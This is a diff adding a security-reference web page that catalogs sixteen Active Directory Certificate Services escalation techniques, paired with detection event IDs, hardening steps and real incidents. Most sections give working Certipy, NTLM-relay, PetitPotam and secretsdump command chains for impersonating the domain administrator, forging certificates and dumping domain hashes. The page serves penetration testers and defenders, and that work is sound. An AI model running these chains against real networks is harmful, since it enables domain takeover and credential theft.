@@ -1,0 +1,468 @@
+---
+title: "AD CS: ESC1-ESC16"
+description: "Operational catalog of all 16 AD Certificate Services abuse techniques with Certipy: exact commands, defensive detection, and real-world cases 2024-2026."
+icon: "key"
+sidebarTitle: "AD CS · Certipy"
+---
+
+{/* JSONLD:START */}
+<script type="application/ld+json">{`{"@context":"https://schema.org","@type":"TechArticle","name":"AD CS abuse: ESC1-ESC16","description":"Catalog of Active Directory Certificate Services abuse techniques with Certipy and defensive detection","inLanguage":"en","url":"https://rootea.es/en/ad-cs","keywords":"AD CS, Certipy, ESC1, ESC8, ESC15, ESC16, EKUwu, Active Directory, NTLM Relay"}`}</script>
+{/* JSONLD:END */}
+
+# AD CS: ESC1-ESC16 catalog
+
+In **June 2021**, Will Schroeder (`@harmj0y`) and Lee
+Chagolla-Christensen released from SpecterOps the
+[**"Certified Pre-Owned"**](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+paper, cataloging the first 8 escalations (ESC1-ESC8) on a PKI
+infrastructure Microsoft had documented poorly since 2008. The
+catalog grew to **ESC16** between 2022 and 2025.
+
+<Note>
+**Why it remains critical in 2026:** AD CS is enabled by default
+in many enterprise environments, its templates ship with
+dangerous flags (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) without
+visual GUI warnings, and Mandiant's **M-Trends 2025** documented
+multiple breaches where **UNC2165 (RansomHub)** abused AD CS to
+create **MFA-exempt** admin accounts.
+</Note>
+
+## Global detection (always first)
+
+```bash
+certipy-ad find -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 -vulnerable -stdout
+```
+
+That single command enumerates CAs, templates, and flags which
+are vulnerable to each ESC. It's the `nmap -sV` of AD CS.
+
+---
+
+## ESC1 — Enrollee Supplies Subject
+
+**Condition:** Template with `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
++ `Client Authentication` EKU + Enroll right for low-priv users.
+The requester decides the `Subject Alternative Name`.
+
+**Exploit:**
+```bash
+certipy-ad req -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca 'CORP-CA' \
+  -template 'VulnTemplate' \
+  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+
+certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.0.0.100
+```
+
+**Impact:** Direct Domain Admin. **Detection:** Event ID
+4886/4887 with SAN ≠ requester. **Remediation:** clear the
+`msPKI-Certificate-Name-Flag` bit, require manager approval.
+
+---
+
+## ESC2 — Any Purpose EKU
+
+**Condition:** Template with `Any Purpose` EKU (OID `2.5.29.37.0`)
+or no EKU. Works for anything, including authentication.
+
+**Exploit:** same flow as ESC1, optionally `-on-behalf-of`.
+**Remediation:** remove `2.5.29.37.0` from `pKIExtendedKeyUsage`,
+fix specific EKUs.
+
+---
+
+## ESC3 — Enrollment Agent
+
+**Condition:** Template with `Certificate Request Agent` EKU (OID
+`1.3.6.1.4.1.311.20.2.1`). The holder can request certs
+**on-behalf-of** other users.
+
+**Exploit:**
+```bash
+certipy-ad req -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca 'CORP-CA' \
+  -template 'EnrollAgent'
+
+certipy-ad req -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 -target CA.CORP.LOCAL -ca 'CORP-CA' \
+  -template 'User' -pfx 'attacker.pfx' \
+  -on-behalf-of 'CORP\Administrator'
+```
+
+**Remediation:** restrict Enrollment Agent to Tier 0, require
+signed approval.
+
+---
+
+## ESC4 — Weak ACL on the template
+
+**Condition:** `WriteDACL`/`GenericAll`/`WriteOwner` on the AD
+template object. We turn the template into ESC1 and run it.
+
+**Exploit:**
+```bash
+certipy-ad template -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 -template 'SecureFiles' \
+  -write-default-configuration
+# then standard ESC1 flow
+# revert with -write-configuration backup.json
+```
+
+**Detection:** Event ID 4900 (template security updated).
+
+---
+
+## ESC5 — Weak ACL on other PKI objects
+
+**Condition:** Weak ACLs on `NTAuthCertificates`,
+`Enrollment Services`, the CA computer object, the
+`CN=Public Key Services` container.
+
+**Exploit (forge from CA private key):**
+```bash
+certipy-ad ca -u 'admin@corp.local' -p 'pwn' \
+  -target CA.CORP.LOCAL -config 'CA.CORP.LOCAL\CORP-CA' -backup
+
+certipy-ad forge -ca-pfx CORP-CA.pfx \
+  -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
+```
+
+**Remediation:** periodic scan with
+[Locksmith 2](https://github.com/jakehildreth/Locksmith2).
+
+---
+
+## ESC6 — `EDITF_ATTRIBUTESUBJECTALTNAME2`
+
+**Condition:** the CA has this flag set, making **any** template
+accept arbitrary SAN in the CSR.
+
+**Remediation:**
+```cmd
+certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+net stop certsvc && net start certsvc
+```
+
+---
+
+## ESC7 — `ManageCA` / `ManageCertificates` abuse
+
+**Condition:** low-priv user with `ManageCA`. Can enable `SubCA`
+template, deny their own requests, and re-approve them.
+
+**Exploit:**
+```bash
+certipy-ad ca -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ca 'CORP-CA' -add-officer attacker
+
+certipy-ad ca -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ca 'CORP-CA' -enable-template SubCA
+
+certipy-ad req -u 'attacker@corp.local' -p 'Passw0rd!' \
+  -ca 'CORP-CA' -template SubCA \
+  -upn administrator@corp.local
+```
+
+**Detection:** Event ID 4888 → 4887 "deny then issue" pattern.
+
+---
+
+## ESC8 — NTLM Relay to Web Enrollment (HTTP)
+
+**Condition:** `http://CA/certsrv/` endpoint active without
+EPA/HTTPS. Combinable with coercion (PetitPotam, PrinterBug,
+DFSCoerce). The classic chain from **low-priv user to Domain
+Admin in 5 minutes**.
+
+```bash
+# Terminal 1 — relay listener at vulnerable endpoint
+impacket-ntlmrelayx -t http://CA.corp.local/certsrv/certfnsh.asp \
+  -smb2support --adcs --template 'DomainController'
+
+# Terminal 2 — coercion: force DC to authenticate
+python3 PetitPotam.py -u attacker -p 'Passw0rd!' \
+  -d corp.local 10.10.10.50 10.10.10.5
+
+# Relay returns DC$ PFX. Authenticate:
+certipy-ad auth -pfx DC1.pfx -dc-ip 10.10.10.5
+# Got hash for 'DC1$@corp.local': aad3b435...:31d6cfe0...
+
+# DCSync with DC$ hash
+impacket-secretsdump -k -no-pass dc1.corp.local -just-dc
+```
+
+**Mitigation:**
+[KB5005413](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
+— force EPA + HTTPS in IIS, disable HTTP on `/certsrv/`.
+
+---
+
+## ESC9 — `CT_FLAG_NO_SECURITY_EXTENSION`
+
+**Condition:** Template flags `0x80000` in
+`msPKI-Enrollment-Flag`. Cert doesn't embed SID extension
+(`szOID_NTDS_CA_SECURITY_EXT`), forcing weak UPN mapping.
+
+**Exploit (chain with account abuse):**
+```bash
+certipy-ad account -u 'attacker' -p 'pwn' -dc-ip 10.0.0.100 \
+  -upn 'administrator' -user 'targetuser' update
+
+certipy-ad req -u 'targetuser@corp.local' -p 'pwn' \
+  -ca 'CORP-CA' -template 'ESC9'
+
+certipy-ad account -u 'attacker' -p 'pwn' \
+  -upn 'targetuser@corp.local' -user 'targetuser' update
+
+certipy-ad auth -pfx 'targetuser.pfx' \
+  -domain corp.local -username administrator
+```
+
+**Remediation:** clear flag `0x80000`.
+
+---
+
+## ESC10 — Weak Certificate Mapping (registry)
+
+**Condition:**
+`HKLM\System\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`
+= 0 or 1 (not Full Enforcement). Since **February 2025**
+Microsoft enforces value 2 by default, but legacy environments
+remain vulnerable.
+
+---
+
+## ESC11 — NTLM Relay to RPC endpoint
+
+**Condition:** `IF_ENFORCEENCRYPTICERTREQUEST` not set in
+`CA\InterfaceFlags`. ICertPassage (RPC) accepts unencrypted NTLM.
+
+**Exploit:**
+```bash
+impacket-ntlmrelayx -t rpc://CA --rpc-mode ICPR \
+  --icpr-ca-name 'CORP-CA' --adcs --template DomainController
+```
+
+---
+
+## ESC12 — CA with YubiHSM and shell access
+
+**Condition:** CA uses YubiHSM with plain-text creds in registry.
+Shell on CA = HSM PIN/auth-key theft. **Remediation:** FIPS 140-3
+Level 3 HSM with creds in device memory.
+
+---
+
+## ESC13 — Issuance Policy linked to privileged group
+
+**Condition:** `msDS-OIDToGroupLink` attribute maps an issuance
+policy OID to a privileged AD group. Cert with that policy gets
+TGT with implicit group membership.
+
+**Exploit:**
+```bash
+certipy-ad req -u 'attacker@corp.local' -p 'pwn' \
+  -ca 'CORP-CA' -template 'ESC13Template'
+
+certipy-ad auth -pfx 'attacker.pfx'
+# Resulting TGT embeds Domain Admins membership
+```
+
+---
+
+## ESC14 — Weak Explicit Mapping
+
+**Condition:** `altSecurityIdentities` attribute uses weak
+mappings `X509RFC822` or `X509IssuerSubject` (deprecated post
+**KB5014754**).
+
+**Exploit:**
+```bash
+certipy-ad account -u 'attacker' -p 'pwn' -dc-ip 10.0.0.100 \
+  -user 'victim' \
+  -alt-sec-identity 'X509:<I>...<S>...' update
+```
+
+**Remediation:** migrate to `X509IssuerSerialNumber`, `X509SKI`
+or `X509SHA1PublicKey`.
+
+---
+
+## ESC15 — EKUwu / CVE-2024-49019
+
+**Condition:** **schema V1** template + enrollee-supplies-subject
+flag. CSR can inject `Application Policies` (Microsoft private
+extension) that **override the template's EKU**. Found by
+**Justin Bollinger (TrustedSec)**, September 2024 — patched
+November 2024.
+
+**Exploit:**
+```bash
+certipy-ad req -u 'missandei@corp.local' -p 'fr3edom' \
+  -ca 'CORP-CA' -template 'WebServer' \
+  -upn 'administrator@corp.local' \
+  -application-policies '1.3.6.1.4.1.311.20.2.2'
+  # ↑ injected Smart Card Logon EKU
+
+certipy-ad auth -pfx administrator.pfx
+```
+
+CVSS 7.8. **Remediation:** Nov-2024 patch, **migrate all V1 to
+V2/V3 schema**, unpublish V1.
+
+Source: [TrustedSec EKUwu](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc),
+[CVE-2024-49019](https://www.wiz.io/vulnerability-database/cve/cve-2024-49019).
+
+---
+
+## ESC16 — SID extension globally disabled
+
+**Condition:** OID `1.3.6.1.4.1.311.25.2` listed in CA
+`policy\DisableExtensionList`. **No cert** issued includes SID
+extension → ESC9 globally.
+
+**Exploit (chain shadow credentials + UPN swap):**
+```bash
+certipy-ad account -u 'attacker' -p 'pwn' -dc-ip 10.0.0.100 \
+  -user 'svc01' read
+
+certipy-ad account -u 'attacker' -p 'pwn' -dc-ip 10.0.0.100 \
+  -upn 'administrator' -user 'svc01' update
+
+certipy-ad shadow -u 'attacker' -p 'pwn' -dc-ip 10.0.0.100 \
+  -account 'svc01' auto
+
+certipy-ad req -k -dc-ip 10.0.0.100 -ca 'CORP-CA' \
+  -template 'User' -target dc01.corp.local
+
+certipy-ad account -u 'attacker' -p 'pwn' \
+  -upn 'svc01@corp.local' -user 'svc01' update
+
+certipy-ad auth -dc-ip 10.0.0.100 -pfx administrator.pfx \
+  -username administrator -domain corp.local
+```
+
+---
+
+## Toolkit 2026: when to use what
+
+| Tool | Language | 2026 best use |
+| --- | --- | --- |
+| **Certipy-ad v5** | Python | First-choice. Covers ESC1-ESC16: `find`, `req`, `auth` (PKINIT), `forge`, `relay`, `shadow`, `account`. Linux native. |
+| **Certify 2.0** | C# | When already on-host Windows without egress. SpecterOps re-released v2.0 in August 2025. |
+| **ForgeCert** | C# | Specifically for forging certs once you have the CA private key (post-ESC5/ESC7). |
+| **PassTheCert** | C#/Python | When PKINIT is blocked and you need to LDAP-bind with the cert directly (DCSync via LDAPS). |
+
+**Rule 2026:** always start with `certipy-ad find`, exploit with
+`certipy-ad req`, fall back to PassTheCert if PKINIT yields
+`KDC_ERR_CLIENT_NOT_TRUSTED`.
+
+---
+
+## Modern defensive detection (2025-2026)
+
+**Microsoft Defender for Identity** released a **dedicated AD CS
+sensor** in 2024. Active alerts in 2026:
+
+- *Suspicious certificate request relayed from a Domain
+  Controller* (covers ESC8/ESC11)
+- *Suspicious deletion of certificate requests*
+- *Suspicious certificate usage over Kerberos (PKINIT)*
+- *Certificate Authority ACL modification with high-privilege
+  addition* (ESC4/ESC5/ESC7)
+
+**Key Windows Event IDs** (audit on CA + DCs):
+
+| ID | Meaning | ESC indicator |
+| --- | --- | --- |
+| 4886 | Cert request received | base of everything |
+| 4887 | Cert issued | SAN ≠ requester → ESC1/6/15 |
+| 4888 | Cert request denied | followed by 4887 → ESC7 |
+| 4890 | CA settings changed | ESC6/ESC7/ESC11/ESC16 |
+| 4898 | Template duplicated | prelude to ESC4 |
+| 4900 | Template security updated | ESC4 in action |
+| 4768 PreAuth=16 | Kerberos PKINIT | correlate with 4887 |
+
+**Monthly defensive audit:**
+
+- [Locksmith 2](https://github.com/jakehildreth/Locksmith2) —
+  automated scan of templates and CA config.
+- [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit) —
+  `Invoke-PKIAudit` and `Get-CertRequest` for retroactive
+  hunting.
+
+---
+
+## Real-world cases
+
+- **CVE-2022-26923 "Certifried"** (May 2022, Oliver Lyak): any
+  domain user could spoof a DC's `dNSHostName` and obtain a DC
+  machine cert. CVSS 8.8, in CISA KEV. Microsoft added the SID
+  extension as response — origin of ESC9/ESC16.
+
+- **CVE-2024-49019 "EKUwu"** (October 2024, TrustedSec): App
+  Policies injection over default V1 templates → DA escalation.
+  Patch November 2024.
+
+- **UNC2165 / RansomHub** (Mandiant M-Trends 2025): exploited
+  AD CS to create MFA-exempt admins before destroying backups
+  and deploying ransomware.
+
+- **Black Basta playbook** (chats leaked February 2025): AD CS
+  appears as standard vector after SMB initial access.
+
+---
+
+## Mandatory hardening
+
+1. **Templates:** disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`
+   except on audited workflow; require Manager Approval; remove
+   `Any Purpose` EKU; **migrate all V1 to V2/V3 schema** (kills
+   ESC15).
+
+2. **CA flags:**
+   ```cmd
+   certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+   certutil -setreg ca\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
+   ```
+
+3. **Web enrollment:** HTTPS-only + EPA + Kerberos auth;
+   **disable HTTP on /certsrv/** (KB5005413).
+
+4. **Monthly ACL audit:** `Invoke-PKIAudit` and
+   `Locksmith2 -Mode 1`; revoke `Write*`/`GenericAll` from
+   Domain Users on any object under
+   `CN=Public Key Services,CN=Services,CN=Configuration`.
+
+5. **Strong Mapping enforcement:**
+   `StrongCertificateBindingEnforcement = 2` on all DCs.
+
+6. **MDI sensor on the CA:** install Defender for Identity AD CS
+   sensor on every enterprise CA.
+
+7. **Unpublish obsolete templates:**
+   `certutil -setcatemplates -<TemplateName>`.
+
+---
+
+## Resources
+
+- [Certified Pre-Owned (original SpecterOps paper)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [Certipy GitHub + Wiki](https://github.com/ly4k/Certipy)
+- [The Hacker Recipes — AD CS](https://www.thehacker.recipes/ad/movement/adcs/)
+- [HackTricks — AD CS Domain Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
+- [Microsoft Defender for Identity AD CS sensor](https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/microsoft-defender-for-identity-expands-its-coverage-with-new-ad-cs-sensor/3894215)
+- [KB5005413 — Mitigating NTLM Relay on AD CS](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429)
+- [Locksmith 2](https://github.com/jakehildreth/Locksmith2)
+- [PSPKIAudit](https://github.com/GhostPack/PSPKIAudit)
+
+---
+
+## Related resources
+
+- [Tactical glossary](/en/glosario) — Kerberos, NTLM,
+  Pass-the-Hash.
+- [Professional methodology](/en/metodologia) — AD decision tree.
+- [OSCP Roadmap](/en/roadmap-oscp) — ESC1 appears recurrently in
+  AD-set machines.
